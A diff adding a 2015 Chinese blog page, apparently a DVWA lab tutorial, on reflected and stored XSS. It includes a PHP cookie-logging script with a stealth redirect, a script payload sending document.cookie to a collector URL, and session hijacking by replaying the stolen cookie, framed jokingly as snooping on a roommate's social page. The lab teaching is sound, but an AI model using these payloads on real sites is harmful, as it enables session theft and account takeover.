@@ -1,0 +1,874 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="xss," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Night May Say" type="application/atom+xml" />
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.0" />
+
+
+
+
+
+
+<meta name="description" content="程序猿的一切痛苦，本质上都来自产品经理的需求变动！  venidic最近应产品经理马大胖的需求，决定要补充ppt一部分内容以掩盖我们打酱油的真面目，大胖的意思是一个酱油的技术点太酱油，两个酱油的技术点拼起来就刁刁的叻！">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[xss]dvwa平台下的实战">
+<meta property="og:url" content="http://venidic.com/2015/05/16/xss-dvwa平台下的实战/index.html">
+<meta property="og:site_name" content="Night May Say">
+<meta property="og:description" content="程序猿的一切痛苦，本质上都来自产品经理的需求变动！  venidic最近应产品经理马大胖的需求，决定要补充ppt一部分内容以掩盖我们打酱油的真面目，大胖的意思是一个酱油的技术点太酱油，两个酱油的技术点拼起来就刁刁的叻！">
+<meta property="og:image" content="http://img.blog.csdn.net/20150518232213570">
+<meta property="og:image" content="http://img.blog.csdn.net/20150518232646715">
+<meta property="og:image" content="http://img.blog.csdn.net/20150518233200431">
+<meta property="og:image" content="http://img.blog.csdn.net/20150519000020475">
+<meta property="og:image" content="http://img.blog.csdn.net/20150518235848120">
+<meta property="og:image" content="http://img.blog.csdn.net/20150519000129537">
+<meta property="og:image" content="http://img.blog.csdn.net/20150519000732643">
+<meta property="og:image" content="http://img.blog.csdn.net/20150519001206392">
+<meta property="og:image" content="http://img.blog.csdn.net/20150519001211802">
+<meta property="og:image" content="http://img.blog.csdn.net/20150519001405920">
+<meta property="og:image" content="http://img.blog.csdn.net/20150519001748969">
+<meta property="og:updated_time" content="2015-11-19T11:55:40.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="[xss]dvwa平台下的实战">
+<meta name="twitter:description" content="程序猿的一切痛苦，本质上都来自产品经理的需求变动！  venidic最近应产品经理马大胖的需求，决定要补充ppt一部分内容以掩盖我们打酱油的真面目，大胖的意思是一个酱油的技术点太酱油，两个酱油的技术点拼起来就刁刁的叻！">
+<meta name="twitter:image" content="http://img.blog.csdn.net/20150518232213570">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    sidebar: {"position":"left","display":"post","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://venidic.com/2015/05/16/xss-dvwa平台下的实战/"/>
+
+
+
+
+
+  <title> [xss]dvwa平台下的实战 | Night May Say </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?d4af486f771155e47d0064be892093c0";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Night May Say</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">呓语</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="st-search-show-outputs">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <form class="site-search-form">
+  <input type="text" id="st-search-input" class="st-search-input st-default-search-input" />
+</form>
+
+<script type="text/javascript">
+  (function(w,d,t,u,n,s,e){w['SwiftypeObject']=n;w[n]=w[n]||function(){
+    (w[n].q=w[n].q||[]).push(arguments);};s=d.createElement(t);
+    e=d.getElementsByTagName(t)[0];s.async=1;s.src=u;e.parentNode.insertBefore(s,e);
+  })(window,document,'script','//s.swiftypecdn.com/install/v2/st.js','_st');
+
+  _st('install', 'yjNAKfs2i_CxMAF_sm43','2.0.0');
+</script>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://venidic.com/2015/05/16/xss-dvwa平台下的实战/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="venidic">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="http://7xieyq.com1.z0.glb.clouddn.com/molang.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Night May Say">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                [xss]dvwa平台下的实战
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2015-05-16T14:01:30+08:00">
+                2015-05-16
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web安全/" itemprop="url" rel="index">
+                    <span itemprop="name">web安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2015/05/16/xss-dvwa平台下的实战/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2015/05/16/xss-dvwa平台下的实战/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p><blockquote class="blockquote-center">程序猿的一切痛苦，本质上都来自产品经理的需求变动！<br>  venidic</blockquote><br>最近应产品经理<del>马大胖</del>的需求，决定要补充ppt一部分内容以掩盖我们打酱油的真面目，大胖的意思是一个酱油的技术点太酱油，两个酱油的技术点拼起来就刁刁的叻！<br><a id="more"></a><br>也是醉了，后来确定的主题竟然是如何帮助同学查看室友空间，更醉的是，这种猥琐的事情要让我来做！然而我并不会web安全，我只想安安静静的看汇编！<br><em>看我忙成狗</em><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;!--</div><div class="line">                       ::</div><div class="line">                      :;J7, :,                        ::;7:</div><div class="line">                      ,ivYi, ,                       ;LLLFS:</div><div class="line">                      :iv7Yi                       :7ri;j5PL</div><div class="line">                     ,:ivYLvr                    ,ivrrirrY2X,</div><div class="line">                     :;r@Wwz.7r:                :ivu@kexianli.</div><div class="line">                    :iL7::,:::iiirii:ii;::::,,irvF7rvvLujL7ur</div><div class="line">                   ri::,:,::i:iiiiiii:i:irrv177JX7rYXqZEkvv17</div><div class="line">                ;i:, , ::::iirrririi:i:::iiir2XXvii;L8OGJr71i</div><div class="line">              :,, ,,:   ,::ir@mingyi.irii:i:::j1jri7ZBOS7ivv,</div><div class="line">                 ,::,    ::rv77iiiriii:iii:i::,rvLq@huhao.Li</div><div class="line">             ,,      ,, ,:ir7ir::,:::i;ir:::i:i::rSGGYri712:</div><div class="line">           :::  ,v7r:: ::rrv77:, ,, ,:i7rrii:::::, ir7ri7Lri</div><div class="line">          ,     2OBBOi,iiir;r::        ,irriiii::,, ,iv7Luur:</div><div class="line">        ,,     i78MBBi,:,:::,:,  :7FSL: ,iriii:::i::,,:rLqXv::</div><div class="line">        :      iuMMP: :,:::,:ii;2GY7OBB0viiii:i:iii:i:::iJqL;::</div><div class="line">       ,     ::::i   ,,,,, ::LuBBu BBBBBErii:i:i:i:i:i:i:r77ii</div><div class="line">      ,       :       , ,,:::rruBZ1MBBqi, :,,,:::,::::::iiriri:</div><div class="line">     ,               ,,,,::::i:  @arqiao.       ,:,, ,:::ii;i7:</div><div class="line">    :,       rjujLYLi   ,,:::::,:::::::::,,   ,:i,:,,,,,::i:iii</div><div class="line">    ::      BBBBBBBBB0,    ,,::: , ,:::::: ,      ,,,, ,,:::::::</div><div class="line">    i,  ,  ,8BMMBBBBBBi     ,,:,,     ,,, , ,   , , , :,::ii::i::</div><div class="line">    :      iZMOMOMBBM2::::::::::,,,,     ,,,,,,:,,,::::i:irr:i:::,</div><div class="line">    i   ,,:;u0MBMOG1L:::i::::::  ,,,::,   ,,, ::::::i:i:iirii:i:i:</div><div class="line">    :    ,iuUuuXUkFu7i:iii:i:::, :,:,: ::::::::i:i:::::iirr7iiri::</div><div class="line">    :     :rk@Yizero.i:::::, ,:ii:::::::i:::::i::,::::iirrriiiri::,</div><div class="line">     :      5BMBBBBBBSr:,::rv2kuii:::iii::,:i:,, , ,,:,:i@petermu.,</div><div class="line">          , :r50EZ8MBBBBGOBBBZP7::::i::,:::::,: :,:,::i;rrririiii::</div><div class="line">              :jujYY7LS0ujJL7r::,::i::,::::::::::::::iirirrrrrrr:ii:</div><div class="line">           ,:  :@kevensun.:,:,,,::::i:i:::::,,::::::iir;ii;7v77;ii;i,</div><div class="line">           ,,,     ,,:,::::::i:iiiii:i::::,, ::::iiiir@xingjief.r;7:i,</div><div class="line">        , , ,,,:,,::::::::iiiiiiiiii:,:,:::::::::iiir;ri7vL77rrirri::</div><div class="line">         :,, , ::::::::i:::i:::i:i::,,,,,:,::i:i:::iir;@Secbone.ii:::</div><div class="line">		 </div><div class="line">--&gt;</div></pre></td></tr></table></figure></p>
+<p>于是经过一番吐槽之后我躁动的心终于平静下来，下面进入正题：</p>
+<p>#环境<br>服务器：Apache<br>数据库：MySQL<br>网址：192.168.1.104/dvwa<br>访问者：192.168.1.113</p>
+<p>关于如何安装dvwa网上的教程很多，这里不再敖述，可以搜索一下，需要注意的是，xampp端口被占用和局域网访问的两个问题。<br><strong>端口占用</strong></p>
+<blockquote>
+<p>1．80端口冲突，解决方法：<br>打开目录C:\xampp\apache\conf(我的安装目录为C:\xampp)下的httpd.conf文件，将Listen 80和 ServerName localhost:80中的80改为8081或其它值（尽量不要使用0－1023端口，这个是系统保留端口），要保持一致。<br>2．监听端口443冲突，解决方法：<br>打开目录C:\xampp\apache\conf\extra (我的安装目录为C:\xampp)下的httpd-ssl.conf文件，将Listen 443这句注释掉：# Listen 443或将443改为4433或其它值（尽量不要使用0－1023）。 </p>
+</blockquote>
+<p><strong>局域网访问</strong></p>
+<blockquote>
+<ol>
+<li><p>修改httpd.conf(xampp/apache/conf/httpd.conf)<br>把Listen 80改成Listen 192.168.0.188:80<br>192.168.0.188换成实际服务器的ip地址</p>
+</li>
+<li><p>打开httpd-xampp.conf(/xampp/apache/conf/extra/httpd-xampp.conf)<br>搜索关键字: Order deny,allow<br>然后在Order deny,allow下面一行有句 Deny from all<br>在Deny from all前加上#<br>完整形式：</p>
+</li>
+</ol>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;LocationMatch &quot;^/(?i:(?:xampp|security|licenses|phpmyadmin|webalizer|server-status|server-info))&quot;&gt;</div><div class="line">    Order deny,allow</div><div class="line">    #Deny from all</div><div class="line">    Allow from 127.0.0.0/8</div><div class="line">       # Require local</div><div class="line">	ErrorDocument 403 /error/XAMPP_FORBIDDEN.html.var</div><div class="line">&lt;/LocationMatch&gt;</div></pre></td></tr></table></figure>
+<p>配置好环境，在局域网下能够成功访问，就可以开始着手攻击了<br><img src="http://img.blog.csdn.net/20150518232213570" alt="这里写图片描述"></p>
+<p>#攻击</p>
+<p>##xss reflected</p>
+<p>###发现漏洞<br>xss发生在一切由输入输出的地方。访问网页的时候发现遇到这样的窗口，在输入venidic的时候，浏览器直接返回成这样的数据<br><img src="http://img.blog.csdn.net/20150518232646715" alt="这里写图片描述"><br>右键查看源码，发现根本没有做任何的过滤就直接返回了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">&lt;div class=&quot;vulnerable_code_area&quot;&gt;</div><div class="line"></div><div class="line">		&lt;form name=&quot;XSS&quot; action=&quot;#&quot; method=&quot;GET&quot;&gt;</div><div class="line">			&lt;p&gt;What&apos;s your name?&lt;/p&gt;</div><div class="line">			&lt;input type=&quot;text&quot; name=&quot;name&quot;&gt;</div><div class="line">			&lt;input type=&quot;submit&quot; value=&quot;Submit&quot;&gt;</div><div class="line">		&lt;/form&gt;</div><div class="line"></div><div class="line">		&lt;pre&gt;Hello venidic &lt;/pre&gt;</div><div class="line"></div><div class="line">	&lt;/div&gt;</div></pre></td></tr></table></figure>
+<p>那我们直接可以利用<code>&lt;/pre&gt;</code>闭合掉前面的一个<code>&lt;pre&gt;</code>标签，然后用<code>&lt;pre&gt;</code>闭合掉<code>&lt;/pre&gt;</code>，在中间就可以填写攻击代码了<br>构造测试代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;/pre&gt;&lt;script&gt;alert(&apos;xss&apos;)&lt;/script&gt;&lt;pre&gt;</div></pre></td></tr></table></figure>
+<p>测试成功<br><img src="http://img.blog.csdn.net/20150518233200431" alt="这里写图片描述"></p>
+<p>###利用漏洞<br>之前一直用xss就是弹个框以证实漏洞的存在，然而着并没有什么卵用，xss的猥琐之处在于它处于前端，可以很容易的造成js脚本在浏览器任意执行，达到窃取cookie，劫持用户会话，甚至是开发出xss worm。因为本人web实在太渣，所以只会讲最基本的盗取cookie的利用方式：</p>
+<p>想要记录来访者cookie需要写一个脚本，如果受害者触发了这段js，则脚本就会记录下受害者的cookie<br>截获cookie的php脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line"></div><div class="line">$cookie = $_GET[&apos;cookie&apos;]; //以GET方式获取cookie变量值</div><div class="line">$ip = getenv (&apos;REMOTE_ADDR&apos;); //远程主机IP地址</div><div class="line">$time=date(&apos;Y-m-d g:i:s&apos;); //以“年-月-日 时：分：秒”的格式显示时间</div><div class="line">$referer=getenv (&apos;HTTP_REFERER&apos;); //链接来源</div><div class="line">$agent = $_SERVER[&apos;HTTP_USER_AGENT&apos;]; //用户浏览器类型</div><div class="line"></div><div class="line">$fp = fopen(&apos;cookie.txt&apos;, &apos;a&apos;); //打开cookie.txt，若不存在则创建它</div><div class="line">fwrite($fp,&quot; IP: &quot; .$ip. &quot;\n Date and Time: &quot; .$time. &quot;\n User Agent:&quot;.$agent.&quot;\n Referer: &quot;.$referer.&quot;\n Cookie: &quot;.$cookie.&quot;\n\n\n&quot;); //写入文件</div><div class="line">fclose($fp); //关闭文件</div><div class="line"></div><div class="line">header(&quot;Location: http://www.baidu.com&quot;)//重定向到baidu，防止发现</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<p>那么js攻击代码就可以这样写：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;/pre&gt;&lt;script&gt;document.location = &apos;http://192.168.1.104/acceptcookie.php?cookie=&apos; + document.cookie;&lt;/script&gt;&lt;pre&gt;</div></pre></td></tr></table></figure>
+<p><img src="http://img.blog.csdn.net/20150519000020475" alt="这里写图片描述"><br>点击提交<br>网页被重定向到了baidu，证明攻击成功<br><img src="http://img.blog.csdn.net/20150518235848120" alt="这里写图片描述"></p>
+<p>打开脚本同目录下的cookie.txt<br><img src="http://img.blog.csdn.net/20150519000129537" alt="这里写图片描述"></p>
+<p><strong>劫持成功</strong></p>
+<p>打开桂林老兵浏览器，修改cookie，然后登陆主页，无需密码直接进入<br><img src="http://img.blog.csdn.net/20150519000732643" alt="这里写图片描述"></p>
+<p><strong>利用成功</strong></p>
+<p>##xss stored</p>
+<p>###发现漏洞<br>继续浏览，发现有留言本<br><img src="http://img.blog.csdn.net/20150519001206392" alt="这里写图片描述"><br>随便填写，发现没有任何过滤<br><img src="http://img.blog.csdn.net/20150519001211802" alt="这里写图片描述"></p>
+<p>攻击代码<br>message处：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;alert(&apos;xss&apos;)&lt;/script&gt;</div></pre></td></tr></table></figure>
+<p>提交<br><img src="http://img.blog.csdn.net/20150519001405920" alt="这里写图片描述"><br>触发成功，退出网站<br>此时，我作为网站管理员从服务器出进入网站管理<br><img src="http://img.blog.csdn.net/20150519001748969" alt="这里写图片描述"><br>触发成功，作为游客浏览留言板，同样触发成功。</p>
+<p>###利用漏洞</p>
+<p>xss利用相当灵活，最简单的cookie窃取的方法同上。</p>
+<p>#后</p>
+<p>程序猿的工作到这里就结束啦，希望马大胖上课演讲顺利！不要辜负我熬夜长出来的痘痘！</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">//                            _ooOoo_  </div><div class="line">//                           o8888888o  </div><div class="line">//                           88&quot; . &quot;88  </div><div class="line">//                           (| -_- |)  </div><div class="line">//                            O\ = /O  </div><div class="line">//                        ____/`---&apos;\____  </div><div class="line">//                      .   &apos; \\| |// `.  </div><div class="line">//                       / \\||| : |||// \  </div><div class="line">//                     / _||||| -:- |||||- \  </div><div class="line">//                       | | \\\ - /// | |  </div><div class="line">//                     | \_| &apos;&apos;\---/&apos;&apos; | |  </div><div class="line">//                      \ .-\__ `-` ___/-. /  </div><div class="line">//                   ___`. .&apos; /--.--\ `. . __  </div><div class="line">//                .&quot;&quot; &apos;&lt; `.___\_&lt;|&gt;_/___.&apos; &gt;&apos;&quot;&quot;.  </div><div class="line">//               | | : `- \`.;`\ _ /`;.`/ - ` : | |  </div><div class="line">//                 \ \ `-. \_ __\ /__ _/ .-` / /  </div><div class="line">//         ======`-.____`-.___\_____/___.-`____.-&apos;======  </div><div class="line">//                            `=---=&apos;  </div><div class="line">//  </div><div class="line">//         .............................................</div></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/xss/" rel="tag"># xss</a>
+          
+        </div>
+      
+
+      
+        
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2015/05/14/MITM-登陆会话劫持/" rel="next" title="[MITM]登陆会话劫持">
+                <i class="fa fa-chevron-left"></i> [MITM]登陆会话劫持
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2015/05/29/LDR-MODULE模块/" rel="prev" title="LDR_MODULE模块的疑问与探索">
+                LDR_MODULE模块的疑问与探索 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+          
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div class="ds-thread" data-thread-key="2015/05/16/xss-dvwa平台下的实战/"
+           data-title="[xss]dvwa平台下的实战" data-url="http://venidic.com/2015/05/16/xss-dvwa平台下的实战/">
+      </div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview sidebar-panel sidebar-panel-active">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="http://7xieyq.com1.z0.glb.clouddn.com/molang.jpg"
+               alt="venidic" />
+          <p class="site-author-name" itemprop="name">venidic</p>
+           
+              <p class="site-description motion-element" itemprop="description">veni vedi veci...</p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">44</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">7</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">26</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/venidic" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  GitHub
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://twitter.com/hiraethshaw" target="_blank" title="Twitter">
+                  
+                    <i class="fa fa-fw fa-twitter"></i>
+                  
+                  Twitter
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://weibo.com/venidic" target="_blank" title="Weibo">
+                  
+                    <i class="fa fa-fw fa-weibo"></i>
+                  
+                  Weibo
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://www.zhihu.com/people/venidic" target="_blank" title="zhihu">
+                  
+                    <i class="fa fa-fw fa-globe"></i>
+                  
+                  zhihu
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=gPbl7unk6ePA8fGu4_-t" target="_blank" title="Email">
+                  
+                    <i class="fa fa-fw fa-envelope"></i>
+                  
+                  Email
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy;  2015 - 
+  <span itemprop="copyrightYear">2017</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">venidic</span>
+</div>
+
+
+<div class="powered-by">
+  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Pisces
+  </a>
+</div>
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.0"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.0"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.0"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.0"></script>
+
+
+
+  
+
+
